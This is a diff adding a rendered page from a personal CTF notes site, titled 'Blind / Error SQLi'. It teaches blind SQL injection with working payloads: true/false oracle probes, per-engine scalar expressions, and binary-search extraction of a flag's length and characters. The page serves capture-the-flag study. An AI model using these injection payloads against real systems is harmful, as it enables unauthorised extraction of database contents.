@@ -1,0 +1,769 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" data-theme="light">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <!--
+Made with Book Theme
+https://github.com/alex-shpak/hugo-book
+-->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Blind and Error-Based SQLi Blind SQLi means no direct data output. You still need a reliable oracle. A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.
+1. Establish the oracle before extracting Choose a known existing ID and preserve the original request/session:
+1 AND 1=1 1 AND 1=2For a quoted value:
+apple&#39; AND 1=1-- - apple&#39; AND 1=2-- -Repeat baseline → true → false → true. Define the exact observable result:
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/web-expl/sqli-blind/">
+  <meta property="og:site_name" content="offsec-n0t3">
+  <meta property="og:title" content="07 · SQLi — Blind / Error">
+  <meta property="og:description" content="Blind and Error-Based SQLi Blind SQLi means no direct data output. You still need a reliable oracle. A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.
+1. Establish the oracle before extracting Choose a known existing ID and preserve the original request/session:
+1 AND 1=1 1 AND 1=2For a quoted value:
+apple&#39; AND 1=1-- - apple&#39; AND 1=2-- -Repeat baseline → true → false → true. Define the exact observable result:">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="docs">
+
+
+  <meta itemprop="name" content="07 · SQLi — Blind / Error">
+  <meta itemprop="description" content="Blind and Error-Based SQLi Blind SQLi means no direct data output. You still need a reliable oracle. A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.
+1. Establish the oracle before extracting Choose a known existing ID and preserve the original request/session:
+1 AND 1=1 1 AND 1=2For a quoted value:
+apple&#39; AND 1=1-- - apple&#39; AND 1=2-- -Repeat baseline → true → false → true. Define the exact observable result:">
+  <meta itemprop="wordCount" content="870">
+
+<title>07 · SQLi — Blind / Error • offsec-n0t3</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="http://localhost:1313/docs/web-expl/sqli-blind/">
+<link rel="stylesheet" href="/book.min.7886b6a45be989e541bea3447ffdf8cfa4eab5872c00b33d9895c3fe20798996.css" integrity="sha256-eIa2pFvpieVBvqNEf/34z6TqtYcsALM9mJXD/iB5iZY=" crossorigin="anonymous">
+
+
+<script type="module" src="/en.search.min.6641e65073282cb36eef05cedef40c45da2ae0b4450909d47bde09f2d8432c67.js" integrity="sha256-ZkHmUHMoLLNu7wXO3vQMRdoq4LRFCQnUe94J8thDLGc=" crossorigin="anonymous"></script>
+  <meta name="theme-color" content="#252637">
+
+<script defer src="/fieldbook.min.04e65c4f438e6e13ced1f07c11e88ce2991776fff8f8dab5afe6834a7cd40d67.js" integrity="sha256-BOZcT0OObhPO0fB8EeiM4pkXdv/4&#43;Nq1r&#43;aDSnzUDWc="></script>
+<link rel="icon" href="/images/fieldmark.svg" type="image/svg+xml">
+
+</head>
+<body dir="ltr" class="book-kind-page book-type-docs">
+  <input type="checkbox" class="hidden toggle" id="menu-control" />
+  <input type="checkbox" class="hidden toggle" id="toc-control" />
+  <main class="container flex">
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
+  <nav>
+<a class="field-brand" href="/" aria-label="offsec-n0t3 home">
+  <span class="brand-sigil" aria-hidden="true">忍</span>
+  <span><strong>offsec<span class="brand-accent">-n0t3</span></strong><small>CTF NOTES / OPEN BOOK</small></span>
+</a>
+
+<div class="book-search hidden">
+  <input id="book-search-input" type="text"
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
+  <div class="book-search-spinner hidden"></div>
+  <ul id="book-search-results"></ul>
+</div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
+
+
+<div class="nav-caption">FIELD DIRECTORY <span aria-hidden="true">↙</span></div>
+<a class="directory-home" href="/docs/">⌂ &nbsp; All fieldnotes</a>
+
+
+
+
+
+
+<ul class="field-tree">
+  
+  
+  <li class="field-tree-section" data-collection="web">
+    <details open>
+      <summary><span>Web Exploitation</span><span class="tree-count">32</span></summary>
+      <ul><li><a href="/docs/web-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/web-expl/methodology/" class="" >00 · First 10 Minutes</a></li>
+
+<li><a href="/docs/web-expl/sqli/" class="" >01 · SQLi — Start Here</a></li>
+
+<li><a href="/docs/web-expl/sqli-mysql/" class="" >02 · SQLi — MySQL / MariaDB</a></li>
+
+<li><a href="/docs/web-expl/sqli-postgresql/" class="" >03 · SQLi — PostgreSQL</a></li>
+
+<li><a href="/docs/web-expl/sqli-sqlite/" class="" >04 · SQLi — SQLite</a></li>
+
+<li><a href="/docs/web-expl/sqli-mssql/" class="" >05 · SQLi — SQL Server</a></li>
+
+<li><a href="/docs/web-expl/sqli-oracle/" class="" >06 · SQLi — Oracle</a></li>
+
+<li><a href="/docs/web-expl/sqli-blind/" class="active" aria-current="page">07 · SQLi — Blind / Error</a></li>
+
+<li><a href="/docs/web-expl/source-disclosure/" class="" >08 · Source / Backup Leaks</a></li>
+
+<li><a href="/docs/web-expl/ssti/" class="" >SSTI · Identify the Engine First</a></li>
+
+<li><a href="/docs/web-expl/nosqli/" class="" >NoSQL Injection · Operators &amp; Blind Reads</a></li>
+
+<li><a href="/docs/web-expl/xss/" class="" >XSS · Context Before Payload</a></li>
+
+<li><a href="/docs/web-expl/auth-idor/" class="" >Auth &amp; IDOR · Compare Two Accounts</a></li>
+
+<li><a href="/docs/web-expl/jwt/" class="" >JWT · Claims, Algorithms &amp; Keys</a></li>
+
+<li><a href="/docs/web-expl/oauth/" class="" >OAuth / Account Linking</a></li>
+
+<li><a href="/docs/web-expl/prototype-pollution/" class="" >Prototype Pollution · Source to Gadget</a></li>
+
+<li><a href="/docs/web-expl/graphql/" class="" >GraphQL · Schema to Resolver</a></li>
+
+<li><a href="/docs/web-expl/csrf-cors/" class="" >CSRF &amp; CORS · Send vs Read</a></li>
+
+<li><a href="/docs/web-expl/websockets/" class="" >WebSockets / Live Sessions</a></li>
+
+<li><a href="/docs/web-expl/command-injection/" class="" >Command Injection</a></li>
+
+<li><a href="/docs/web-expl/lfi-traversal/" class="" >Traversal &amp; LFI</a></li>
+
+<li><a href="/docs/web-expl/ssrf/" class="" >SSRF</a></li>
+
+<li><a href="/docs/web-expl/xxe/" class="" >XXE &amp; XML Parsers</a></li>
+
+<li><a href="/docs/web-expl/file-upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/web-expl/deserialization/" class="" >Deserialization</a></li>
+
+<li><a href="/docs/web-expl/business-logic/" class="" >Business Logic &amp; Races</a></li>
+
+<li><a href="/docs/web-expl/http-cache/" class="" >HTTP, Cache &amp; Smuggling</a></li>
+
+<li><a href="/docs/web-expl/php-quirks/" class="" >PHP · Types / Hashes / Parsers</a></li>
+
+<li><a href="/docs/web-expl/ldap-xpath/" class="" >LDAP / XPath Injection</a></li>
+
+<li><a href="/docs/web-expl/open-redirect/" class="" >Open Redirect / URL Parsing</a></li>
+
+<li><a href="/docs/web-expl/encoding-filters/" class="" >Encoding &amp; Filter Bypasses</a></li>
+
+<li><a href="/docs/web-expl/python-snippets/" class="" >Python · Reusable Web Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="network">
+    <details >
+      <summary><span>Network Exploitation</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/network-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/network-expl/packet-triage/" class="" >01 · Packet Triage</a></li>
+
+<li><a href="/docs/network-expl/http-streams/" class="" >02 · HTTP / File Streams</a></li>
+
+<li><a href="/docs/network-expl/dns/" class="" >03 · DNS / Encoded Labels</a></li>
+
+<li><a href="/docs/network-expl/tls-ssh/" class="" >04 · TLS / SSH</a></li>
+
+<li><a href="/docs/network-expl/tcp-udp/" class="" >05 · TCP / UDP Sessions</a></li>
+
+<li><a href="/docs/network-expl/wifi/" class="" >06 · Wi-Fi Capture Analysis</a></li>
+
+<li><a href="/docs/network-expl/can-bus/" class="" >07 · CAN / Cannelloni</a></li>
+
+<li><a href="/docs/network-expl/protocols/" class="" >08 · FTP / Mail / ICMP / SMB</a></li>
+
+<li><a href="/docs/network-expl/python-snippets/" class="" >09 · Python / Ready Helpers</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="stego">
+    <details >
+      <summary><span>Steganography</span><span class="tree-count">8</span></summary>
+      <ul><li><a href="/docs/steganograph-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/steganograph-expl/triage/" class="" >First 10 Minutes</a></li>
+
+<li><a href="/docs/steganograph-expl/images-lsb/" class="" >Images: LSB &amp; Bit Planes</a></li>
+
+<li><a href="/docs/steganograph-expl/png-jpeg/" class="" >PNG &amp; JPEG Structure</a></li>
+
+<li><a href="/docs/steganograph-expl/archives-carving/" class="" >Archives &amp; File Carving</a></li>
+
+<li><a href="/docs/steganograph-expl/audio/" class="" >Audio: Samples &amp; Spectrograms</a></li>
+
+<li><a href="/docs/steganograph-expl/pdf-documents/" class="" >PDF &amp; Office Documents</a></li>
+
+<li><a href="/docs/steganograph-expl/text-unicode/" class="" >Text, Whitespace &amp; Unicode</a></li>
+
+<li><a href="/docs/steganograph-expl/python-snippets/" class="" >Offline Python Toolkit</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="reversing">
+    <details >
+      <summary><span>Reverse Engineering</span><span class="tree-count">9</span></summary>
+      <ul><li><a href="/docs/reversing-expl/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/reversing-expl/triage/" class="" >Triage · First Five Minutes</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-cheatsheet/" class="" >Ghidra Cheatsheet · From Strings to Check</a></li>
+
+<li><a href="/docs/reversing-expl/ghidra-plugins/" class="" >Ghidra Plugins · Built-ins &amp; Offline Extras</a></li>
+
+<li><a href="/docs/reversing-expl/static-analysis/" class="" >Static Analysis · Bytes, Types &amp; Control Flow</a></li>
+
+<li><a href="/docs/reversing-expl/dynamic-debugging/" class="" >Dynamic Debugging · Break, Inspect, Dump</a></li>
+
+<li><a href="/docs/reversing-expl/strings-encodings/" class="" >Strings &amp; Encodings · Preserve the Bytes</a></li>
+
+<li><a href="/docs/reversing-expl/crypto-obfuscation/" class="" >Crypto &amp; Obfuscation · Identify, Model, Verify</a></li>
+
+<li><a href="/docs/reversing-expl/dotnet/" class="" >.NET · dnSpyEx, Resources &amp; IL</a></li>
+
+<li><a href="/docs/reversing-expl/python-snippets/" class="" >Python Snippets · Byte Workbench &amp; Check Models</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="tools">
+    <details >
+      <summary><span>Tools · Visual Cheatsheets</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/tools-cheatsheet/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/tools-cheatsheet/cyberchef-cheatsheet/" class="" >CyberChef · Visual Recipes</a></li>
+
+<li><a href="/docs/tools-cheatsheet/approved-tools-map/" class="" >39 Tools · Technique Map</a></li>
+
+<li><a href="/docs/tools-cheatsheet/python-library/" class="" >Python · Offline Snippet Library</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li><a href="/docs/cli_cheatsheet/" class="">CLI Cheatsheet</a></li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="pico">
+    <details >
+      <summary><span>picoCTF</span><span class="tree-count">4</span></summary>
+      <ul><li><a href="/docs/picoctf/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><details ><summary>Rev</summary><ul><li><a href="/docs/picoctf/rev/">Overview ↗</a></li>
+
+</ul></details></li>
+
+<li><details ><summary>Web</summary><ul><li><a href="/docs/picoctf/web/">Overview ↗</a></li>
+
+<li><a href="/docs/picoctf/web/file_upload/" class="" >File Upload</a></li>
+
+<li><a href="/docs/picoctf/web/ip_bypassing/" class="" >Proxy Mnipu</a></li>
+
+<li><a href="/docs/picoctf/web/sqli/" class="" >Sqli</a></li>
+
+<li><a href="/docs/picoctf/web/eval_ssti/" class="" >SSTI</a></li>
+
+</ul></details></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="scripts">
+    <details >
+      <summary><span>Scripts</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/scripts/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/scripts/brute_force_py/" class="" >Brute Force Py</a></li>
+
+<li><a href="/docs/scripts/craft_img_py/" class="" >Craft Img Py</a></li>
+
+<li><a href="/docs/scripts/lro_rlo_fileext/" class="" >Lro Rlo File Ext</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="windows">
+    <details >
+      <summary><span>Windows Rev</span><span class="tree-count">3</span></summary>
+      <ul><li><a href="/docs/windows_rev/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/windows_rev/arc4_decrypt/" class="" >Arc4 Decrypt</a></li>
+
+<li><a href="/docs/windows_rev/dmp_hunt4c2/" class="" >Dmp Hunt4c2</a></li>
+
+<li><a href="/docs/windows_rev/x64dbg_cheatsheet/" class="" >X64dbg Cheatsheet</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+  
+  <li class="field-tree-section" data-collection="approved">
+    <details >
+      <summary><span>AJCBBC Allowed Tools</span><span class="tree-count">39</span></summary>
+      <ul><li><a href="/docs/ajcbbc_allow_tools/" class="section-overview ">Overview ↗</a></li>
+      
+
+<li><a href="/docs/ajcbbc_allow_tools/cyberchef/" class="" >CyberChef</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wireshark/" class="" >Wireshark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdf_viewer/" class="" >PDF Viewer</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openvpn_client/" class="" >OpenVPN Client</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/google_chrome/" class="" >Google Chrome</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/wsl/" class="" >Windows Subsystem for Linux (WSL)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/python3/" class="" >Python 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/uv/" class="" >uv</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/gdb/" class="" >gdb</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/objdump/" class="" >objdump</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/strings/" class="" >strings</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zsteg/" class="" >zsteg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/binwalk/" class="" >binwalk</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/exiftool/" class="" >ExifTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/pdftotext/" class="" >pdftotext (Poppler utils)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/can_utils/" class="" >can-utils</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/cannelloni/" class="" >cannelloni</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zeek/" class="" >Zeek</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/zbar/" class="" >ZBar</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/burp_suite_community/" class="" >Burp Suite Community Edition</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/jq/" class="" >jq</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/ghidra/" class="" >Ghidra</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/sleuth_kit/" class="" >The Sleuth Kit</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssl/" class="" >OpenSSL</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xz/" class="" >xz</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/qpdf/" class="" >qpdf</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/llvm_mc/" class="" >llvm-mc (LLVM tools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/xxd/" class="" >xxd</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/fsck_fat/" class="" >fsck.fat (dosfstools)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/rsactftool/" class="" >RsaCtfTool</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/volatility3/" class="" >Volatility 3</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/openssh_session_key_recovery/" class="" >OpenSSH-Session-Key-Recovery</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/x64dbg/" class="" >x64dbg</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/autopsy/" class="" >Autopsy</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/hxd/" class="" >HxD</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/tshark/" class="" >TShark</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/notepad_plus_plus/" class="" >Notepad&#43;&#43;</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/dnspyex/" class="" >dnSpyEx (dnSpy)</a></li>
+
+<li><a href="/docs/ajcbbc_allow_tools/eric_zimmerman_tools/" class="" >Eric Zimmerman&#39;s Tools</a></li>
+
+</ul>
+    </details>
+  </li>
+  
+  
+</ul>
+
+
+
+
+
+
+
+<div class="nav-footer"><span class="status-dot" aria-hidden="true"></span> OFFLINE / PERSONAL NOTES<br><span>Payloads · methods · worked examples</span></div>
+
+</nav>
+
+
+
+
+  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
+
+
+
+  </div>
+</aside>
+ 
+
+    <div class="book-page">
+      <header class="book-header hidden">
+        
+  <div class="flex align-center justify-between">
+  <label for="menu-control">
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
+  </label>
+
+  <h3>07 · SQLi — Blind / Error</h3>
+
+  <label for="toc-control">
+    
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
+    
+  </label>
+</div>
+
+
+  
+  <aside class="hidden">
+    
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-establish-the-oracle-before-extracting">1. Establish the oracle before extracting</a></li>
+    <li><a href="#2-pick-the-scalar-expression">2. Pick the scalar expression</a></li>
+    <li><a href="#3-extract-length-first">3. Extract length first</a></li>
+    <li><a href="#4-extract-each-character-manually">4. Extract each character manually</a></li>
+    <li><a href="#5-enumerate-schema-with-the-same-method">5. Enumerate schema with the same method</a></li>
+    <li><a href="#6-error-based-routes">6. Error-based routes</a>
+      <ul>
+        <li><a href="#detailed-conversion-errors">Detailed conversion errors</a></li>
+        <li><a href="#oracle-conditional-error">Oracle conditional error</a></li>
+        <li><a href="#sqlite-conditional-error">SQLite conditional error</a></li>
+      </ul>
+    </li>
+    <li><a href="#7-time-based-routes">7. Time-based routes</a></li>
+    <li><a href="#8-final-checklist">8. Final checklist</a></li>
+  </ul>
+</nav>
+
+
+
+  </aside>
+  
+ 
+      </header>
+
+      <div id="field-content" tabindex="-1"></div>
+
+<div class="page-topline" data-collection="web"><nav aria-label="Breadcrumb"><a href="/docs/">NOTEBOOK</a><span>/</span><a href="/docs/web-expl/">Web Exploitation</a></nav><span>5 MIN READ</span></div>
+
+
+
+      
+  <article class="markdown book-article"><h1 id="blind-and-error-based-sqli">Blind and Error-Based SQLi<a class="anchor" href="#blind-and-error-based-sqli"></a></h1>
+<p><strong>Blind SQLi means no direct data output. You still need a reliable oracle.</strong> A change in row visibility, message, HTTP status, exception, or response time can answer one yes/no question per probe.</p>
+<h2 id="1-establish-the-oracle-before-extracting">1. Establish the oracle before extracting<a class="anchor" href="#1-establish-the-oracle-before-extracting"></a></h2>
+<p>Choose a known existing ID and preserve the original request/session:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">2</span></span></span></code></pre></div><p>For a quoted value:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>apple<span style="color:#a3be8c">&#39; AND 1=1-- -
+</span></span></span><span style="display:flex;"><span><span style="color:#a3be8c">apple&#39;</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#b48ead">1</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">2</span><span style="color:#616e87;font-style:italic">-- -</span></span></span></code></pre></div><p>Repeat baseline → true → false → true. Define the exact observable result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>TRUE  = response JSON contains product id 1
+</span></span><span style="display:flex;"><span>FALSE = response JSON has an empty products array
+</span></span><span style="display:flex;"><span>ERROR = backend syntax error / separate status</span></span></code></pre></div><p>Do not classify every non-TRUE response as FALSE. CSRF failures, connection timeouts, rate limits, generic errors, and expired cookies are separate outcomes.</p>
+<h2 id="2-pick-the-scalar-expression">2. Pick the scalar expression<a class="anchor" href="#2-pick-the-scalar-expression"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Engine</th>
+          <th>Example target expression</th>
+          <th>Character code at position 1</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>MySQL</td>
+          <td><code>(SELECT flag FROM flags ORDER BY id LIMIT 1)</code></td>
+          <td><code>ASCII(SUBSTRING(EXPR,1,1))</code></td>
+      </tr>
+      <tr>
+          <td>PostgreSQL</td>
+          <td><code>(SELECT flag FROM public.flags ORDER BY id LIMIT 1)</code></td>
+          <td><code>ascii(substring(EXPR,1,1))</code></td>
+      </tr>
+      <tr>
+          <td>SQLite</td>
+          <td><code>(SELECT flag FROM flags ORDER BY id LIMIT 1)</code></td>
+          <td><code>unicode(substr(EXPR,1,1))</code></td>
+      </tr>
+      <tr>
+          <td>SQL Server</td>
+          <td><code>(SELECT TOP 1 flag FROM dbo.flags ORDER BY id)</code></td>
+          <td><code>ASCII(SUBSTRING(EXPR,1,1))</code></td>
+      </tr>
+      <tr>
+          <td>Oracle</td>
+          <td><code>(SELECT FLAG FROM FLAGS WHERE ID=1)</code></td>
+          <td><code>ASCII(SUBSTR(EXPR,1,1))</code></td>
+      </tr>
+  </tbody>
+</table>
+<p><code>EXPR</code> is notation; replace it with the actual scalar expression, including parentheses. Enumerate table/column names with engine catalogs if unknown. Confirm the row exists before comparing a NULL result.</p>
+<h2 id="3-extract-length-first">3. Extract length first<a class="anchor" href="#3-extract-length-first"></a></h2>
+<p>MySQL example, numeric injection:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">LENGTH</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">16</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">LENGTH</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">32</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> <span style="color:#81a1c1;font-weight:bold">LENGTH</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">24</span></span></span></code></pre></div><p>If <code>&gt;16</code> is true, <code>&gt;32</code> false, and <code>&gt;24</code> true, the length is in 25–32. Keep splitting that interval. Verify the final candidate with <code>=N</code>.</p>
+<p>SQL Server uses <code>LEN</code> (trailing spaces ignored); engines differ on byte versus character length. For ASCII CTF flags this is usually simple; use hex if the representation is uncertain.</p>
+<h2 id="4-extract-each-character-manually">4. Extract each character manually<a class="anchor" href="#4-extract-each-character-manually"></a></h2>
+<p>Example first-character ASCII binary search:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> ASCII<span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SUBSTRING</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">),</span><span style="color:#b48ead">1</span><span style="color:#eceff4">,</span><span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">79</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> ASCII<span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SUBSTRING</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">),</span><span style="color:#b48ead">1</span><span style="color:#eceff4">,</span><span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">103</span>
+</span></span><span style="display:flex;"><span><span style="color:#b48ead">1</span> <span style="color:#81a1c1;font-weight:bold">AND</span> ASCII<span style="color:#eceff4">(</span><span style="color:#81a1c1;font-weight:bold">SUBSTRING</span><span style="color:#eceff4">((</span><span style="color:#81a1c1;font-weight:bold">SELECT</span> flag <span style="color:#81a1c1;font-weight:bold">FROM</span> flags <span style="color:#81a1c1;font-weight:bold">ORDER</span> <span style="color:#81a1c1;font-weight:bold">BY</span> id <span style="color:#81a1c1;font-weight:bold">LIMIT</span> <span style="color:#b48ead">1</span><span style="color:#eceff4">),</span><span style="color:#b48ead">1</span><span style="color:#eceff4">,</span><span style="color:#b48ead">1</span><span style="color:#eceff4">))</span><span style="color:#81a1c1">&gt;</span><span style="color:#b48ead">91</span></span></span></code></pre></div><p>Use the previous answer to choose the next threshold. For printable ASCII, start with an appropriate interval such as 32–126, then verify equality. Characters outside that range require a broader range / hex strategy.</p>
+<table>
+  <thead>
+      <tr>
+          <th>Answer to <code>code &gt; midpoint</code></th>
+          <th>New interval</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>TRUE</td>
+          <td><code>midpoint+1</code> through current upper bound</td>
+      </tr>
+      <tr>
+          <td>FALSE, with a valid normal response</td>
+          <td>Current lower bound through <code>midpoint</code></td>
+      </tr>
+      <tr>
+          <td>Transport / backend error</td>
+          <td>Repeat or repair the request; do not update bounds</td>
+      </tr>
+  </tbody>
+</table>
